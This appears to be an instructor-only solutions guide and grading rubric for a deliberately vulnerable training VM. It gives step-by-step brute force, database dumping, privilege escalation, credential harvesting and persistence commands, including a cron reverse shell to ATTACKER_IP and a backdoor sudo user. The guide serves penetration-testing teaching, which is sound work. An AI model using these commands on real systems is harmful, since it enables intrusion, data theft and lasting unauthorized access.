# Liverpul Corp VM - Solutions Guide (Instructors Only)

**WARNING: This file contains solutions to all lab exercises. Students should not access this file.**

---

## System Credentials

### User Accounts
```
pedro:football
pablo:welcome
paco:sunshine
```

### Database
```
Username: admin
Password: admin
Database: fakystore
```

### FTP
```
Anonymous access: Enabled
Users: pedro, pablo, paco (with their respective passwords)
```

---

## Exercise 1: Network Reconnaissance - Solutions

### Port Scanning Results
```bash
nmap -sV 192.168.56.10
```

**Expected Open Ports:**
- 21/tcp - FTP (vsftpd 3.0.5)
- 22/tcp - SSH (OpenSSH 9.3_p2)
- 80/tcp - HTTP (nginx 1.24.0)
- 3306/tcp - MySQL (MariaDB 10.11.11)

### OS Detection
```bash
nmap -O 192.168.56.10
```

**Expected Result:**
- OS: Linux (Alpine Linux 3.18)
- Kernel: 6.1.x

### Service Enumeration
```bash
nmap -sV -sC 192.168.56.10
```

**Key Findings:**
- vsftpd 3.0.5 (FTP) - Anonymous login enabled
- OpenSSH 9.3_p2 - No obvious CVEs
- nginx 1.24.0 - Web server
- MariaDB 10.11.11 - Database server

---

## Exercise 2: FTP Enumeration - Solutions

### Anonymous Access
```bash
ftp 192.168.56.10
# Username: anonymous
# Password: (blank)
```

**Expected Findings:**
- Anonymous FTP is enabled
- Directory: /var/ftp/pub (writable)
- Anonymous can upload files

### User Access
```bash
# After discovering credentials
ftp 192.168.56.10
# Username: pedro
# Password: football
```

**Expected Directories:**
- pedro has access to /home/pedro/ftp
- Similar for pablo and paco

### Banner Information
```bash
nc 192.168.56.10 21
```

**Expected Output:**
```
220 (vsFTPd 3.0.5)
```

---

## Exercise 3: Password Cracking - Solutions

### FTP Brute Force
```bash
# Create users file
echo -e "pedro\npablo\npaco" > users.txt

# Brute force with small wordlist
hydra -L users.txt -P passwords.txt ftp://192.168.56.10
```

**Expected Results:**
```
[21][ftp] host: 192.168.56.10   login: pedro   password: football
[21][ftp] host: 192.168.56.10   login: pablo   password: welcome
[21][ftp] host: 192.168.56.10   login: paco    password: sunshine
```

### MySQL Brute Force
```bash
hydra -l admin -P passwords.txt mysql://192.168.56.10
```

**Expected Results:**
```
[3306][mysql] host: 192.168.56.10   login: admin   password: admin
```

### Timing Analysis
- With small wordlist (10-20 passwords): < 1 minute
- With rockyou.txt (14 million passwords): Could take hours
- The target passwords are in top 1000 most common

### Hash Cracking (if system access obtained)
```bash
# From /etc/shadow (if root access gained)
# Hashes would be SHA-512 format ($6$...)
# All passwords crack quickly with rockyou.txt
```

---

## Exercise 4: Web Application Analysis - Solutions

### Web Reconnaissance
```bash
curl http://192.168.56.10
```

**Key Findings:**
- Technology Stack:
  - Angular JS 1.8.2
  - Angular Material 1.2.1
  - Nginx 1.24.0
  - PHP 8.1
  - MySQL/MariaDB backend

### API Analysis
```bash
curl http://192.168.56.10/api.php
```

**Vulnerabilities Found:**
1. **Information Disclosure**: Full database schema exposed
2. **No Authentication**: API accessible without credentials
3. **Direct Database Queries**: Potential for SQL injection
4. **No Rate Limiting**: Susceptible to brute force
5. **No HTTPS**: All traffic in cleartext

### API Response Analysis
```json
{
    "success": true,
    "data": {
        "products": [...],
        "customers": [...],
        "orders": [...]
    }
}
```

**Security Issues:**
- Exposes all customer information
- No access controls
- Credentials hardcoded in PHP (`admin:admin`)

### SQL Injection Testing
```bash
# The current API doesn't take parameters, but if modified:
curl "http://192.168.56.10/api.php?id=1'"
# Could test for SQL injection
```

**Code Review Findings** (from api.php):
```php
// Direct database queries without prepared statements
$result = $conn->query("SELECT * FROM products");
```
- Vulnerable to SQL injection if user input added
- No input sanitization
- No parameterized queries

### Security Headers
```bash
curl -I http://192.168.56.10
```

**Missing Headers:**
- X-Frame-Options
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security
- X-XSS-Protection

---

## Exercise 5: Database Exploitation - Solutions

### Remote Database Access
```bash
mysql -h 192.168.56.10 -u admin -padmin
```

**Success Factors:**
- MySQL configured to accept remote connections
- Weak credentials (admin/admin)
- No firewall restrictions

### Database Enumeration
```sql
-- List all databases
SHOW DATABASES;

-- Output:
-- fakystore
-- information_schema
-- mysql
-- performance_schema
-- sys

-- Select fakystore
USE fakystore;

-- Show tables
SHOW TABLES;

-- Output:
-- customers
-- orders
-- products
```

### Data Exfiltration
```sql
-- Extract all products
SELECT * FROM products;
-- 5 products with prices

-- Extract customers
SELECT * FROM customers;
-- 3 customers with emails

-- Extract orders
SELECT * FROM orders;
-- 4 orders linking customers to products
```

### Privilege Check
```sql
-- Check privileges
SHOW GRANTS;

-- Output shows admin has ALL PRIVILEGES
GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost' WITH GRANT OPTION
```

### File System Access Attempts
```sql
-- Try to read files (may fail due to secure_file_priv)
SELECT LOAD_FILE('/etc/passwd');

-- Try to write files (may fail due to permissions)
SELECT "test" INTO OUTFILE '/tmp/test.txt';

-- Check file privileges
SHOW VARIABLES LIKE 'secure_file_priv';
```

### Full Database Dump
```bash
mysqldump -h 192.168.56.10 -u admin -padmin fakystore > dump.sql
```

---

## Exercise 6: SSH Access - Solutions

### SSH Brute Force
```bash
hydra -l pedro -P passwords.txt ssh://192.168.56.10
```

**Expected Result:**
```
[22][ssh] host: 192.168.56.10   login: pedro   password: football
```

### Initial Access
```bash
ssh pedro@192.168.56.10
# Password: football
```

**User Information:**
```bash
id
# uid=1002(pedro) gid=1002(pedro) groups=1002(pedro)

whoami
# pedro

pwd
# /home/pedro
```

### Post-Access Enumeration
```bash
# Check sudo privileges
sudo -l
# [sudo] password for pedro:
# User pedro may run the following commands on liverpul-corp:
# (Output depends on configuration)

# List home directory
ls -la ~

# Check other users
cat /etc/passwd | grep -E 'pedro|pablo|paco'
```

---

## Exercise 7: Privilege Escalation - Solutions

### Enumeration Findings

#### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common SUID binaries on Alpine:**
- /usr/bin/sudo
- /usr/bin/su
- /bin/busybox
- /usr/bin/passwd

#### Sudo Configuration
```bash
sudo -l
```

**Possible scenarios:**
1. User has sudo privileges
2. User can run specific commands as root
3. No sudo privileges (need alternative escalation)

#### Writable Files
```bash
# Check for writable configs
find /etc -writable -type f 2>/dev/null

# Check for writable service files
ls -la /etc/init.d/
```

#### Configuration Files with Credentials
```bash
# Web application configs
cat /var/www/liverpul/api.php
# Contains: $user = 'admin'; $pass = 'admin';

# MySQL config
cat /etc/my.cnf.d/mariadb-server.cnf

# FTP config
cat /etc/vsftpd/vsftpd.conf

# Nginx config
cat /etc/nginx/http.d/default.conf
```

### Privilege Escalation Methods

#### Method 1: Sudo (if available)
```bash
sudo -l
# If pedro can run commands as root
sudo su
# Or
sudo /bin/sh
```

#### Method 2: MySQL Root Access
```bash
# If MySQL runs as root and has file write permissions
mysql -u admin -padmin
USE mysql;
# Create malicious UDF or exploit file write
```

#### Method 3: Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# If writable cron script exists
echo '#!/bin/sh' > /path/to/script.sh
echo 'cp /bin/sh /tmp/rootshell' >> /path/to/script.sh
echo 'chmod +s /tmp/rootshell' >> /path/to/script.sh
```

#### Method 4: Writable Service Files
```bash
# If service files are writable
# Modify a service to execute commands as root
```

### Post-Exploitation (Root Access)
```bash
# Access shadow file
cat /etc/shadow

# Extract hashes
grep -E 'pedro|pablo|paco' /etc/shadow

# Access all database files
ls -la /var/lib/mysql/

# Read all user files
cat /home/*/.bash_history
```

---

## Exercise 8: Network Traffic Analysis - Solutions

### Packet Capture
```bash
# Start capture
sudo tcpdump -i eth0 host 192.168.56.10 -w capture.pcap

# Perform activities:
# 1. FTP login
# 2. HTTP request
# 3. MySQL query
```

### FTP Traffic Analysis
```bash
tshark -r capture.pcap -Y "ftp"
```

**Expected Findings:**
```
FTP Command: USER pedro
FTP Command: PASS football
```

**Security Issue:** Passwords in cleartext!

### HTTP Traffic Analysis
```bash
tshark -r capture.pcap -Y "http"
```

**Expected Findings:**
- HTTP GET requests to /
- HTTP GET requests to /api.php
- Full API responses with database data
- No encryption

### MySQL Traffic Analysis
```bash
tshark -r capture.pcap -Y "mysql"
```

**Expected Findings:**
- Login packet with credentials
- Query strings visible
- Result sets visible
- No encryption

### Credential Extraction
```bash
# Extract FTP passwords
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg

# Output: football, welcome, sunshine
```

### Wireshark Display Filters
```
ftp.request.command == "USER"  # Show usernames
ftp.request.command == "PASS"  # Show passwords
mysql.query                     # Show SQL queries
http.request.method == "GET"   # Show HTTP requests
```

---

## Exercise 9: Comprehensive Assessment - Solution Outline

### Assessment Timeline

#### Phase 1: Reconnaissance (30 minutes)
1. Network scan: 5 minutes
2. Service enumeration: 15 minutes
3. Version detection: 10 minutes

#### Phase 2: Vulnerability Analysis (45 minutes)
1. Identify vulnerabilities in each service
2. Research exploits
3. Prioritize targets

#### Phase 3: Exploitation (1 hour)
1. Anonymous FTP access: 5 minutes
2. Password cracking: 15-30 minutes
3. Database access: 10 minutes
4. Web application testing: 15 minutes

#### Phase 4: Post-Exploitation (30 minutes)
1. Privilege escalation: 20 minutes
2. Data collection: 10 minutes

#### Phase 5: Reporting (2 hours)
1. Document findings
2. Create screenshots
3. Write recommendations

### Vulnerability Summary

| Vulnerability | Severity | CVSS | Impact |
|---------------|----------|------|--------|
| Anonymous FTP | High | 7.5 | Unauthorized file access |
| Weak Passwords | Critical | 9.8 | Account compromise |
| MySQL Remote Access | Critical | 9.8 | Database compromise |
| No HTTPS | Medium | 5.3 | Traffic interception |
| API Info Disclosure | High | 7.5 | Data leakage |
| No Input Validation | High | 8.1 | SQL injection potential |

### Recommended Remediations

#### Critical Priority
1. Change all default passwords
2. Disable MySQL remote access or restrict to specific IPs
3. Implement strong password policy
4. Disable anonymous FTP

#### High Priority
5. Implement HTTPS/SSL
6. Add authentication to API endpoints
7. Use prepared statements for SQL queries
8. Add input validation and sanitization

#### Medium Priority
9. Add security headers
10. Implement rate limiting
11. Enable logging and monitoring
12. Regular security updates

---

## Exercise 10: Post-Exploitation - Solutions

### Data Harvesting

#### Database Dump
```bash
mysqldump -h 192.168.56.10 -u admin -padmin --all-databases > all_databases.sql
```

#### Configuration Files
```bash
# From inside VM
tar -czf configs.tar.gz /etc/nginx/ /etc/vsftpd/ /etc/my.cnf.d/ /var/www/
```

#### User Data
```bash
# Command histories
cat /home/*/.bash_history

# SSH keys (if any)
cat /home/*/.ssh/id_rsa

# Password files
cat /etc/passwd
cat /etc/shadow  # (requires root)
```

### Persistence Mechanisms (REMOVE AFTER TESTING!)

#### SSH Keys
```bash
# Add your public key
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Backdoor User
```bash
# Create backdoor (REMOVE AFTER LAB!)
sudo adduser backdoor
sudo usermod -aG sudo backdoor
```

#### Cron Job Callback
```bash
# Add cron job (REMOVE AFTER LAB!)
(crontab -l ; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

### Log Analysis

#### Auth Logs
```bash
# SSH login attempts
cat /var/log/auth.log | grep sshd

# Sudo commands
cat /var/log/auth.log | grep sudo
```

#### Web Logs
```bash
# Nginx access
cat /var/log/nginx/access.log

# Nginx errors
cat /var/log/nginx/error.log
```

#### FTP Logs
```bash
cat /var/log/vsftpd.log
```

#### MySQL Logs
```bash
# Query log (if enabled)
cat /var/lib/mysql/*.log
```

### Forensic Artifacts

**Evidence of Attack:**
- Failed login attempts in auth.log
- Successful logins from external IPs
- Database queries in MySQL logs
- FTP connections in vsftpd.log
- HTTP requests in nginx access.log
- Command history in .bash_history

---

## Common Student Mistakes

### 1. Using Wrong IP Address
- **Mistake:** Using 192.168.56.1 instead of 192.168.56.10
- **Solution:** Verify IP with `vagrant ssh -c "ip addr"`

### 2. Not Installing MySQL Client
- **Mistake:** "mysql: command not found"
- **Solution:** `sudo apt install mysql-client`

### 3. Wrong Wordlist Path
- **Mistake:** Using compressed rockyou.txt
- **Solution:** `gunzip /usr/share/wordlists/rockyou.txt.gz`

### 4. Forgetting -h Flag for MySQL
- **Mistake:** `mysql -u admin -padmin` (connects to localhost)
- **Solution:** `mysql -h 192.168.56.10 -u admin -padmin`

### 5. Not Reading Hydra Output Carefully
- **Mistake:** Missing successful credentials in verbose output
- **Solution:** Use `-o results.txt` to save output

### 6. Impatience with Brute Force
- **Mistake:** Stopping brute force too early
- **Solution:** Passwords are in first 1000 attempts

### 7. Incorrect Nmap Syntax
- **Mistake:** `nmap 192.168.56.10:80` (wrong format)
- **Solution:** `nmap -p 80 192.168.56.10`

---

## Grading Rubric

### Exercise 1: Reconnaissance (10 points)
- Port scan completed: 3 points
- Service versions identified: 3 points
- OS detection attempted: 2 points
- Documentation quality: 2 points

### Exercise 2: FTP Enumeration (10 points)
- Anonymous access tested: 3 points
- Banner grabbed: 2 points
- Directory structure mapped: 3 points
- Documentation: 2 points

### Exercise 3: Password Cracking (15 points)
- FTP credentials found (3 users): 6 points
- MySQL credentials found: 4 points
- Methodology documented: 3 points
- Time analysis included: 2 points

### Exercise 4: Web Analysis (10 points)
- Technology stack identified: 3 points
- API vulnerabilities found: 4 points
- Security headers analyzed: 2 points
- Documentation: 1 point

### Exercise 5: Database Exploitation (15 points)
- Remote access achieved: 5 points
- All tables enumerated: 4 points
- Data extracted: 3 points
- Privilege analysis: 3 points

### Exercise 6: SSH Access (10 points)
- SSH credentials found: 5 points
- Initial access achieved: 3 points
- Post-access enumeration: 2 points

### Exercise 7: Privilege Escalation (15 points)
- Enumeration performed: 5 points
- Escalation method identified: 5 points
- Root access achieved: 3 points
- Documentation: 2 points

### Exercise 8: Traffic Analysis (10 points)
- Packet capture completed: 3 points
- Credentials extracted: 4 points
- Protocol analysis: 2 points
- Documentation: 1 point

### Exercise 9: Full Assessment (10 points)
- Complete methodology: 4 points
- Professional report format: 3 points
- Risk ratings accurate: 2 points
- Recommendations practical: 1 point

### Exercise 10: Post-Exploitation (5 points)
- Data harvesting: 2 points
- Understanding of persistence: 2 points
- Clean-up performed: 1 point

**Total: 100 points**

---

## Quick Reset Commands

```bash
# Complete reset
vagrant destroy -f && vagrant up

# Restart services only
vagrant ssh -c "sudo rc-service mariadb restart"
vagrant ssh -c "sudo rc-service nginx restart"
vagrant ssh -c "sudo rc-service vsftpd restart"

# Check service status
vagrant ssh -c "sudo rc-service --list | grep -E '(mariadb|nginx|vsftpd|php-fpm)'"
```

---

## Additional Teaching Notes

### Timing Suggestions
- **Full Lab**: 4-6 hours
- **Quick Assessment**: 2-3 hours (Exercises 1-5 only)
- **Advanced Only**: 2-3 hours (Exercises 6-10 only)

### Prerequisites
- Basic Linux command line knowledge
- Understanding of networking fundamentals
- Familiarity with common protocols (HTTP, FTP, SQL)
- Kali Linux or similar pentesting distribution

### Learning Objectives
1. Understand reconnaissance techniques
2. Practice service enumeration
3. Learn password attack methods
4. Identify web application vulnerabilities
5. Exploit database misconfigurations
6. Practice privilege escalation
7. Understand network traffic analysis
8. Develop professional reporting skills

### Safety Reminders for Students
- Only test the lab VM (192.168.56.10)
- Do not use these techniques on unauthorized systems
- Remove all persistence mechanisms after testing
- Document all activities for learning
- Understand the legal implications of unauthorized access

---

**End of Solutions Guide**

---

**REMINDER:** This file should be kept confidential and only accessible to instructors.
